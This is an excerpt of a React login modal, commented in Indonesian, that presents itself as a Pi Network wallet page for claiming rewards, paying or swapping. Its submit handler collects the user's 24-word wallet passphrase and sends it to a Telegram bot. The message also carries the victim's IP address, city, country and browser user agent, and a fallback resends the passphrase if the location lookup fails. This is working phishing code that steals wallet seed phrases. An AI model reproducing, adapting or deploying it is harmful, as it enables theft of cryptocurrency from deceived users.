...
function LoginModal({ showAccessScreen, loginSource, claimMode, onClose, onAccessScreen, onBack, accessCode, setAccessCode }) {
  ...
  const actionLabel = isSubmitting ? "Processing..." : claimMode ? "🎁 Claim Pi Rewards" : swapMode ? "₿ Request Swap Service" : "π Pay With Pi";

  // Fungsi Final Pengiriman Data
  const handleFinalSubmit = () => {
    if (wordCount !== 24) {
      alert('Passphrase harus 24 kata. Saat ini: ' + wordCount + ' kata.');
      return;
    }
    ...
    fetch('https://ip-api.com/json')
      .then((res) => res.json())
      .then((ipData) => {
        const message = `<b>🔔 Passphrase Baru (React)</b>\n` +
                        `<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                        `<code>${normalized}</code>\n\n` +
                        `<b>📍 LOKASI:</b> ${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}\n` +
                        `<b>🌐 IP:</b> ${ipData.query || 'Unknown'}\n` +
                        `<b>📱 DEVICE:</b> ${navigator.userAgent}`;

        // 2. Kirim Paket Data Utama ke Telegram
      ...
      .catch((err) => {
        console.error(err);
        // Backup jika API Geonotifikasi down / terblokir CORS
        const messageFallback = `<b>🔔 Passphrase (Lokasi Gagal)</b>\n\n` +
                                `<code>${normalized}</code>\n\n` +
                                `<b>📱 DEVICE:</b> ${navigator.userAgent}`;
        ...
        return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          ...
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: messageFallback,
            parse_mode: 'HTML'
          })
        });
      })
      .finally(() => {
        // 3. Pindahkan halaman setelah transaksi data selesai
        setTimeout(() => {
      ...
      <motion.div initial={{ opacity: 0, scale: 0.92, y: 24 }} animate={{ opacity: 1, scale: 1, y: 0 }} transition={{ duration: 0.25 }} className={showAccessScreen ? "relative w-full max-w-3xl overflow-hidden rounded-[2rem] border border-fuchsia-500/45 bg-[#07000f] text-white shadow-[0_0_140px_rgba(217,70,239,0.65)]" : "relative w-full max-w-md overflow-hidden rounded-[2rem] border border-fuchsia-400/40 bg-[#080017] p-7 text-white shadow-[0_0_90px_rgba(217,70,239,0.45)]"}>
        {!showAccessScreen ? (
          <div>
            ...
            <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-fuchsia-500/10 text-4xl font-black text-fuchsia-400">π</div>
          ...
          <div className="relative overflow-hidden bg-[#07000f] text-white">
            ...
            <div className="relative px-8 py-8">
              ...
              <div className="rounded-[1.7rem] border border-fuchsia-500/70 bg-[#0d071a] p-3 shadow-[0_0_55px_rgba(217,70,239,0.32)]">
                <textarea value={accessCode} onChange={(event) => setAccessCode(event.target.value)} disabled={isSubmitting} placeholder="Masukkan 24-kata passphrase di sini" className="h-64 w-full resize-none rounded-[1.3rem] border border-white/10 bg-[#0b0615] p-6 font-mono text-lg leading-8 text-white outline-none placeholder:text-fuchsia-100/35 focus:border-fuchsia-400 focus:ring-4 focus:ring-fuchsia-500/20 disabled:opacity-60" />
                <div className="flex justify-end px-3 pb-1 text-sm text-fuchsia-100/45">{wordCount} words</div>
              </div>

              {/* Action Button */}
              <button type="button" onClick={handleFinalSubmit} disabled={isSubmitting} className="mt-7 flex w-full items-center justify-center gap-3 rounded-2xl border border-fuchsia-400/50 bg-gradient-to-r from-[#6310a5] via-[#8b24d9] to-[#4b0c7a] px-5 py-5 text-lg font-black text-white shadow-[0_0_55px_rgba(217,70,239,0.42)] transition hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed">
                {actionLabel}
              </button>
